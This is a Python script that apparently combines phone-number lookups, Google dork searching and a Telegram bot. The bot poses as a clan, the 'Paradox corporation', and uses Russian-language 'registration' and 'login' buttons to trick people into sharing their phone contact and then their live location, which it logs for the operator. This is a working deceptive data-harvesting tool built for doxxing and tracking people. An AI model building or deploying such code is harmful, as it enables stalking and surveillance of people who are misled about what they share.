import telebot
import phonenumbers
import csv
import json
from phonenumbers import parse
from phonenumbers import geocoder
from phonenumbers import timezone
from phonenumbers import carrier
from phonenumbers.phonenumberutil import NumberParseException
from googlesearch import search
from telebot import types
import time

def Generate(phone, dork, amount, TOKEN):
	if phone:
		parse_num = phonenumbers.parse(phone, None)
		timezone_num = timezone.time_zones_for_number(parse_num)
		carrier_num = carrier.name_for_number(parse_num, "en")
		region_num = geocoder.description_for_number(parse_num, "en")
		valid_num = phonenumbers.is_valid_number(parse_num)
		possible_num = phonenumbers.is_possible_number(parse_num)
		info_num = f' PARSE_NUM: {parse_num} \n TIMEZONE_NUM: {timezone_num} \n CARRIER_NUM: {carrier_num} \n REGION_NUM: {region_num} \n VALID_NUM: {valid_num} \n POSSIBLE_NUM: {possible_num}'
		print(info_num)
		phone = phone.replace("+", "")
		info_num = f'WHAAPP: https://api.WhatsApp.com/send?phone={phone}? \nViber: viber://add?number={phone} \nSkype: skype:{phone}?call'
		print(info_num)
	if dork and amount:
		requ = 0
		counter = 0

		for results in search(dork, tld="com", lang="en", num=int(amount), start=0, stop=None, pause=0):
			counter = counter + 1
			print ("!", counter, results)
			time.sleep(0.1)
			requ += 1
			if requ >= int(amount):
				break

	if TOKEN:
		bot = telebot.TeleBot(TOKEN)
		print("bot start")

		@bot.message_handler(commands=['start'])
		def GetPhone(message):
			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
			button_phone1 = types.KeyboardButton(text="регистрация", request_contact=True)
			button_phone2 = types.KeyboardButton(text="логин", request_contact=True)
			keyboard.add(button_phone1, button_phone2)
			bot.send_message(message.chat.id, '❗Спасибо за выбор корпорации Paradox❗ \nЗдесь вы можете: \n1.поговорить с членами клана. \n2. Работайте над любым своим проектом. \n3. Оказать моральную помощь нуждающимся людям.', reply_markup=keyboard)
			bot.send_message(message.chat.id, '✅Пожалуйста, войдите или зарегистрируйтесь для продолжения', reply_markup=keyboard)
		@bot.message_handler(content_types=['contact'])
		def Contact(message):
			if message.contact is not None:
				print(message.contact)
				keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
				button_phone1 = types.KeyboardButton(text="ЗАПРОС", request_location=True)
				keyboard.add(button_phone1)
				bot.send_message(message.chat.id, '✅Почти все, осталось только подать заявку на вступление', reply_markup=keyboard)
		@bot.message_handler(content_types=['location'])
		def Location(message):
			if message.location is not None:
				print(message.location)

		bot.polling()



def Input():
	phone = input("NUM:      ").replace("-", "").replace("(", "").replace(")", "").replace(" ", "")
	dork = input("DORK:     ")
	amount = input("DORK_NUM: ")
	TOKEN = input("TOKEN:    ")

	Generate(phone, dork, amount, TOKEN)
Input()
